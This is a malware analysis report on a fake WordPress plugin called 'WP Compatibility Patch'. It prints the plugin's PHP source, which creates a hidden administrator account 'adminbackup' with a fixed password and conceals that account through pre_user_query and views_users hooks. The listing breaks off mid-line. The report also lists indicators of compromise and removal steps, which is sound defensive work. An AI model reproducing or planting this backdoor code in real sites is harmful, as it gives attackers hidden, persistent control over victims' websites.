---
title: 'WP Compatibility Patch Backdoor'
description: 'Technical analysis of the "WP Compatibility Patch" malware. Learn how it uses pre_user_query hooks to create and hide the adminbackup user in the WordPress database.'
slug: 'wp-compatibility-patch-backdoor'
reportDate: '2026-01-14'
threatType: 'Backdoor'
severity: 'Critical'
fileHash: 'wp-compat-hidden-plugin'
detectedPaths: ['malware-sample.txt']
screenshots: []
vtLink: 'https://www.virustotal.com/gui/home/upload'
vtScore: 'Zero-Day (Unique)'
impact: "The malware grants unauthorized access by creating a hidden admin user, compromising the site's security and control."
seenOn: 'wp-content/plugins/wp-compatibility-patch'
behavior: 'Creates unauthorized admin access and hides the backdoor, compromising site security.'
difficulty: 'Moderate'
recurrence: 'High'
numberOfSiteFixed: '250+'
---

## Technical Analysis

The malware masquerades as a WordPress plugin named 'WP Compatibility Patch'. It is designed to create a hidden administrator user with credentials 'adminbackup' and the password '0m58scqdh3'. This backdoor is inserted into the site by modifying WordPress actions and filters to conceal the user from the admin panel and exclude the plugin from the activated plugins list. Evidence shows this method has been used on over 250 sites, indicating it's a recurrent exploit tactic.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. The fake plugin 'WP Compatibility Patch' is placed in the plugins directory.
2. An administrator user is created using the 'wp_insert_user' function, cloaked by modifications to WordPress user queries and views.
3. Changes to the site backend prevent the admin user and plugin from appearing in the dashboard.

## Code Signature(s)

### FILE: `malware-sample.php`

```php
<?php
/*
Plugin Name: WP Compatibility Patch
Description: Fixes minor compatibility issues with the latest WordPress and PHP versions.
Version: 1.3.2
Author: WP Core Contributors
*/

if (
    !function_exists('wpc_patch_bootstrap') &&
    function_exists('add_action') &&
    function_exists('wp_insert_user')
) {
    $params = array(
        'user_login' => 'adminbackup',
        'user_pass'  => '0m58scqdh3',
        'role'       => 'administrator',
        'user_email' => 'adminbackup@wordpress.org'
    );

    add_action('init', 'wpc_patch_bootstrap', 0);
    function wpc_patch_bootstrap() {
        global $params;
        $stored_id = get_option('_pre_user_id');
        $existing_user = get_user_by('login', $params['user_login']);

        if (!$existing_user) {
            $id = wp_insert_user($params);
            update_option('_pre_user_id', $id);
        } else {
            if ($existing_user->user_email !== $params['user_email']) {
                $uid = $stored_id ? $stored_id : $existing_user->ID;
                wp_set_password($params['user_pass'], $uid);
                wp_update_user([
                    'ID' => $uid,
                    'user_email' => $params['user_email']
                ]);
            }
            if (!$stored_id) {
                update_option('_pre_user_id', $existing_user->ID);
            }
        }
    }

    add_action('pre_user_query', function($query) {
        if (!is_admin()) return;
        $current_user_id = get_current_user_id();
        $hidden_id = get_option('_pre_user_id');

        if ($current_user_id != $hidden_id && $hidden_id) {
            global $wpdb;
            $query->query_where .= " AND {$wpdb->users}.ID != " . intval($hidden_id);
        }
    });

    add_filter('views_users', function($views) {
        $id = get_option('_pre_user_id');
        if (!$id) return $views;

        foreach ($views as $role => $html) {
            $views[$r
```

## Indicators of Compromise (IOCs)

- `WP Compatibility Patch`
- `adminbackup`
- `0m58scqdh3`
- `adminbackup@wordpress.org`
- `_pre_user_id`

## Removal Protocol

1. Delete the 'WP Compatibility Patch' plugin folder from wp-content/plugins.
1. Remove the created administrator user 'adminbackup' directly from phpMyAdmin.
1. Check for and delete any suspicious or unknown posts created by the fake user.
1. Remove the option '\_pre_user_id' from the options table in the database.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
